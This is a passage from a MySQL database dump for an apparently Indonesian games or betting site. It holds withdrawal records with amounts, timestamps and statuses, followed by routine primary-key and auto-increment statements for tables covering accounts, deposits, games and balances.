(171, 98, 'WD-3419773249', 'emoney', 152, '300000', '2024-03-03 22:10:10', 'proses'),
(172, 98, 'WD-1734720366', 'emoney', 152, '300000', '2024-03-03 22:10:18', 'proses'),
(173, 98, 'WD-8267492023', 'emoney', 152, '300000', '2024-03-03 22:10:26', 'proses'),
(174, 98, 'WD-8182449081', 'emoney', 152, '300000', '2024-03-03 22:10:32', 'proses'),
(175, 98, 'WD-2196388893', 'emoney', 152, '300000', '2024-03-03 22:10:38', 'proses'),
(176, 98, 'WD-3105765933', 'emoney', 152, '300000', '2024-03-03 22:10:43', 'proses'),
(177, 98, 'WD-4248991034', 'emoney', 152, '300000', '2024-03-03 22:10:48', 'proses'),
(178, 98, 'WD-2872151854', 'emoney', 152, '300000', '2024-03-03 22:10:56', 'proses'),
(179, 98, 'WD-8106569404', 'emoney', 152, '300000', '2024-03-03 22:11:02', 'proses'),
(180, 98, 'WD-0822376511', 'emoney', 152, '300000', '2024-03-03 22:11:09', 'proses'),
(181, 79, 'WD-4331037918', 'bank', 133, '50000', '2024-03-03 22:15:21', 'proses'),
(182, 98, 'WD-7790189490', 'emoney', 152, '50000', '2024-03-03 22:37:46', 'proses'),
(183, 98, 'WD-8260471177', 'emoney', 152, '300000', '2024-03-03 22:37:58', 'proses'),
(184, 98, 'WD-4094275767', 'emoney', 152, '300000', '2024-03-03 22:38:06', 'proses'),
(185, 98, 'WD-0686019081', 'emoney', 152, '300000', '2024-03-03 22:38:13', 'proses'),
(186, 98, 'WD-6598571453', 'emoney', 152, '300000', '2024-03-03 22:38:38', 'proses'),
(187, 98, 'WD-3769488574', 'emoney', 152, '300000', '2024-03-03 22:38:44', 'proses'),
(188, 98, 'WD-7366829704', 'emoney', 152, '300000', '2024-03-03 22:38:49', 'proses'),
(189, 98, 'WD-5108605783', 'emoney', 152, '300000', '2024-03-03 22:38:53', 'proses'),
(190, 98, 'WD-9293373951', 'emoney', 152, '300000', '2024-03-03 22:39:00', 'proses'),
(191, 98, 'WD-5251601965', 'emoney', 152, '300000', '2024-03-03 22:39:05', 'proses'),
(192, 98, 'WD-5235016742', 'emoney', 152, '300000', '2024-03-03 22:39:11', 'proses'),
(193, 98, 'WD-0909295633', 'emoney', 152, '300000', '2024-03-03 22:39:16', 'proses'),
(194, 98, 'WD-7493109863', 'emoney', 152, '300000', '2024-03-03 22:39:22', 'proses'),
(195, 98, 'WD-3295081544', 'emoney', 152, '300000', '2024-03-03 22:39:27', 'proses'),
(196, 98, 'WD-8462407086', 'emoney', 152, '300000', '2024-03-03 22:39:35', 'proses'),
(197, 98, 'WD-9852133073', 'emoney', 152, '300000', '2024-03-03 22:39:41', 'proses'),
(198, 98, 'WD-0162377521', 'emoney', 152, '300000', '2024-03-03 22:39:46', 'proses'),
(199, 98, 'WD-6939925135', 'emoney', 152, '300000', '2024-03-03 22:39:51', 'proses'),
(200, 98, 'WD-9415300175', 'emoney', 152, '300000', '2024-03-03 22:39:55', 'proses'),
(201, 98, 'WD-9681696957', 'emoney', 152, '300000', '2024-03-03 22:40:00', 'proses'),
(202, 98, 'WD-4866297121', 'emoney', 152, '300000', '2024-03-03 22:40:05', 'proses'),
(203, 104, 'WD-2690692293', 'bank', 0, '3300000', '2024-03-03 22:40:06', 'proses'),
(204, 98, 'WD-2219105788', 'emoney', 152, '300000', '2024-03-03 22:40:10', 'proses'),
(205, 98, 'WD-8195754435', 'emoney', 152, '300000', '2024-03-03 22:40:15', 'proses'),
(206, 104, 'WD-6569810999', '', 0, '3300000', '2024-03-03 22:40:19', 'proses'),
(207, 98, 'WD-1806244571', 'emoney', 152, '300000', '2024-03-03 22:40:19', 'proses'),
(208, 98, 'WD-5030822266', 'emoney', 152, '300000', '2024-03-03 22:40:24', 'proses'),
(209, 98, 'WD-8032622210', 'emoney', 152, '300000', '2024-03-03 22:40:28', 'proses'),
(210, 98, 'WD-3828139239', 'emoney', 152, '300000', '2024-03-03 22:40:33', 'proses'),
(211, 98, 'WD-1120493705', 'emoney', 152, '300000', '2024-03-03 22:40:39', 'proses'),
(212, 98, 'WD-5599269633', 'emoney', 152, '300000', '2024-03-03 22:40:45', 'proses'),
(213, 80, 'WD-3209166492', 'emoney', 134, '2000000', '2024-03-03 22:49:04', 'proses'),
(214, 104, 'WD-4922388005', 'bank', 0, '100000', '2024-03-03 23:31:05', 'proses'),
(215, 104, 'WD-6423525708', 'emoney', 159, '500000', '2024-03-03 23:35:35', 'proses'),
(216, 104, 'WD-6242810626', 'emoney', 159, '6000000', '2024-03-03 23:36:26', 'batal'),
(217, 109, 'WD-8383334831', 'bank', 0, '50000', '2024-03-03 23:52:54', 'batal'),
(218, 104, 'WD-9846908393', 'emoney', 159, '200000', '2024-03-03 23:54:43', 'batal'),
(219, 107, 'WD-1385654540', 'emoney', 162, '5000000', '2024-03-04 00:06:26', 'proses'),
(220, 107, 'WD-0661988458', 'bank', 0, '5000000', '2024-03-04 00:07:50', 'proses'),
(221, 104, 'WD-9057774641', 'emoney', 159, '150000', '2024-03-04 00:09:54', 'proses'),
(222, 109, 'WD-7689841938', 'bank', 0, '100000', '2024-03-04 00:18:21', 'proses'),
(223, 116, 'WD-2368930659', 'emoney', 171, '3000000', '2024-03-04 00:58:30', 'proses'),
(224, 116, 'WD-4964183514', '', 0, '3000000', '2024-03-04 00:59:28', 'proses'),
(225, 114, 'WD-2611913186', 'bank', 0, '4000000', '2024-03-04 00:59:44', 'proses'),
(226, 114, 'WD-1858616293', 'bank', 0, '400000', '2024-03-04 01:00:11', 'proses'),
(227, 104, 'WD-5023676324', 'emoney', 159, '100000', '2024-03-04 01:08:54', 'proses'),
(228, 115, 'WD-9495740249', 'emoney', 170, '2050000', '2024-03-04 01:12:21', 'proses'),
(229, 116, 'WD-1858903240', 'bank', 0, '4000000', '2024-03-04 01:12:33', 'proses'),
(230, 116, 'WD-4910972724', '', 0, '4000000', '2024-03-04 01:12:44', 'proses'),
(231, 115, 'WD-8438327702', 'emoney', 170, '2050000', '2024-03-04 01:12:56', 'proses'),
(232, 116, 'WD-5790894582', 'emoney', 171, '4000000', '2024-03-04 01:13:03', 'proses'),
(233, 115, 'WD-5285557654', 'emoney', 170, '2050000', '2024-03-04 01:20:58', 'proses'),
(234, 115, 'WD-5205188014', 'emoney', 170, '50878', '2024-03-04 01:27:26', 'proses'),
(235, 116, 'WD-4122075870', 'bank', 0, '4000000', '2024-03-04 01:44:36', 'proses'),
(236, 116, 'WD-1177631893', 'emoney', 171, '4000000', '2024-03-04 01:57:08', 'proses'),
(237, 116, 'WD-9452478466', 'emoney', 171, '4000000', '2024-03-04 01:57:42', 'proses'),
(238, 121, 'WD-9565075597', 'emoney', 176, '8000000', '2024-03-04 02:10:20', 'proses'),
(239, 122, 'WD-7278142097', 'emoney', 177, '4000000', '2024-03-04 02:12:50', 'proses'),
(240, 122, 'WD-0262727421', 'emoney', 177, '4000000', '2024-03-04 02:13:46', 'proses'),
(241, 122, 'WD-2978853246', 'emoney', 177, '100000', '2024-03-04 02:17:43', 'proses'),
(242, 113, 'WD-7586969759', 'bank', 0, '150000', '2024-03-04 02:26:26', 'proses'),
(243, 123, 'WD-7126631855', 'bank', 0, '50000', '2024-03-04 02:29:45', 'proses'),
(244, 123, 'WD-2833282621', 'bank', 0, '50000', '2024-03-04 02:33:09', 'proses'),
(245, 123, 'WD-7549533818', 'emoney', 178, '50000', '2024-03-04 02:41:10', 'proses'),
(246, 76, 'WD-1749771980', 'bank', 129, '1000000', '2024-03-04 02:43:18', 'proses'),
(247, 76, 'WD-5206403618', 'bank', 129, '1000000', '2024-03-04 02:44:13', 'proses'),
(248, 122, 'WD-4227763827', 'emoney', 177, '400000', '2024-03-04 02:47:25', 'proses'),
(249, 122, 'WD-1604841221', 'bank', 0, '4000000', '2024-03-04 02:47:33', 'proses'),
(250, 123, 'WD-5106780802', 'emoney', 178, '58000', '2024-03-04 02:48:31', 'proses');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `akun`
--
ALTER TABLE `akun`
  ADD PRIMARY KEY (`id_akun`);

--
-- Indexes for table `bank`
--
ALTER TABLE `bank`
  ADD PRIMARY KEY (`id_bank`);

--
-- Indexes for table `deposit`
--
ALTER TABLE `deposit`
  ADD PRIMARY KEY (`id_deposit`);

--
-- Indexes for table `games`
--
ALTER TABLE `games`
  ADD PRIMARY KEY (`id_games`);

--
-- Indexes for table `menu_games`
--
ALTER TABLE `menu_games`
  ADD PRIMARY KEY (`id_menu_games`);

--
-- Indexes for table `pengaturan`
--
ALTER TABLE `pengaturan`
  ADD PRIMARY KEY (`id_pengaturan`);

--
-- Indexes for table `pengunjung`
--
ALTER TABLE `pengunjung`
  ADD PRIMARY KEY (`id_pengunjung`);

--
-- Indexes for table `promosi`
--
ALTER TABLE `promosi`
  ADD PRIMARY KEY (`id_promosi`);

--
-- Indexes for table `provider`
--
ALTER TABLE `provider`
  ADD PRIMARY KEY (`id_provider`);

--
-- Indexes for table `rekening`
--
ALTER TABLE `rekening`
  ADD PRIMARY KEY (`id_rekening`);

--
-- Indexes for table `rekening_admin`
--
ALTER TABLE `rekening_admin`
  ADD PRIMARY KEY (`id_rekening_admin`);

--
-- Indexes for table `rekening_anggota`
--
ALTER TABLE `rekening_anggota`
  ADD PRIMARY KEY (`id_rekening_anggota`);

--
-- Indexes for table `saldo`
--
ALTER TABLE `saldo`
  ADD PRIMARY KEY (`id_saldo`);

--
-- Indexes for table `slideshow`
--
ALTER TABLE `slideshow`
  ADD PRIMARY KEY (`id_slideshow`);

--
-- Indexes for table `sub_menu_games`
--
ALTER TABLE `sub_menu_games`
  ADD PRIMARY KEY (`id_sub_menu_games`);

--
-- Indexes for table `withdraw`
--
ALTER TABLE `withdraw`
  ADD PRIMARY KEY (`id_withdraw`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `akun`
--
ALTER TABLE `akun`
  MODIFY `id_akun` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=126;

--
-- AUTO_INCREMENT for table `bank`
--
ALTER TABLE `bank`
  MODIFY `id_bank` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=91;

--
-- AUTO_INCREMENT for table `deposit`
--
ALTER TABLE `deposit`
  MODIFY `id_deposit` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=221;

--
-- AUTO_INCREMENT for table `games`
--
ALTER TABLE `games`
  MODIFY `id_games` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=109;

--
-- AUTO_INCREMENT for table `menu_games`
--
ALTER TABLE `menu_games`
  MODIFY `id_menu_games` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `pengaturan`
--
ALTER TABLE `pengaturan`
  MODIFY `id_pengaturan` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- AUTO_INCREMENT for table `pengunjung`
--
ALTER TABLE `pengunjung`
  MODIFY `id_pengunjung` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=290;

--
-- AUTO_INCREMENT for table `promosi`
--
ALTER TABLE `promosi`
  MODIFY `id_promosi` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `provider`
--
ALTER TABLE `provider`
  MODIFY `id_provider` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `rekening`
--
ALTER TABLE `rekening`
  MODIFY `id_rekening` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=63;

--
-- AUTO_INCREMENT for table `rekening_admin`
--
ALTER TABLE `rekening_admin`
  MODIFY `id_rekening_admin` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `rekening_anggota`
--
ALTER TABLE `rekening_anggota`
  MODIFY `id_rekening_anggota` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=181;

--
-- AUTO_INCREMENT for table `saldo`
--
ALTER TABLE `saldo`
  MODIFY `id_saldo` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=126;

--
-- AUTO_INCREMENT for table `slideshow`
--
ALTER TABLE `slideshow`
  MODIFY `id_slideshow` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT for table `sub_menu_games`
--
ALTER TABLE `sub_menu_games`
  MODIFY `id_sub_menu_games` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=74;

--
-- AUTO_INCREMENT for table `withdraw`
--
ALTER TABLE `withdraw`
  MODIFY `id_withdraw` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=251;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
